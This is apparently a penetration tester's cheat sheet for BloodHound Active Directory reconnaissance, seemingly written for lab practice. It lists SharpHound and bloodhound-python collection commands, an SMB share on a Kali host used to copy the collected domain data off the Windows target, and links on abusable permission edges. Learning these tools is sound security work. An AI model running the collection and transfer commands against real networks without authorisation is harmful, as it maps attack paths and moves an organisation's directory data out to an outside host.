There are 2 ways to run Bloodhound
## 1. SharpHound.ps1
```
Get SharpHound.ps1 from ~/Desktop/tools

Import-Module .\SharpHound.ps1

Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Users\[user]\Desktop\ -OutputPrefix "domain name" (collecting domain data)

After collection, transfer the BloodHound.zip file into Kali
To transfer, 
On Kali:
impacket-smbserver test . -smb2support  -username kali -password kali
On Windows:
net use m: \\Kali_IP\test /user:kali kali
copy [filename] m:\
```
## 2. bloodhound-python
```
bloodhound-python -c All -d [domain] -u [user] -p [password] -ns [dc-ip]
```

## Starting up Bloodhound
```
First, start neo4j
sudo neo4j start

Go to Bloodhound folder in ~/Desktop/tools/BloodHound-linux-x64
./BloodHound --no-sandbox

Always clear db before starting
```
## Reading the edges for more info
https://support.bloodhoundenterprise.io/hc/en-us/articles/17224136169371-About-BloodHound-Edges - General
Some common ones:
https://support.bloodhoundenterprise.io/hc/en-us/articles/17312347318043-GenericAll - GenericAll
https://support.bloodhoundenterprise.io/hc/en-us/articles/17312755938203-WriteOwner - WriteOwner (also look at Certified HTB)
https://support.bloodhoundenterprise.io/hc/en-us/articles/17312765477787-WriteDacl - WriteDACL
https://support.bloodhoundenterprise.io/hc/en-us/articles/17222775975195-WriteSPN - WriteSPN
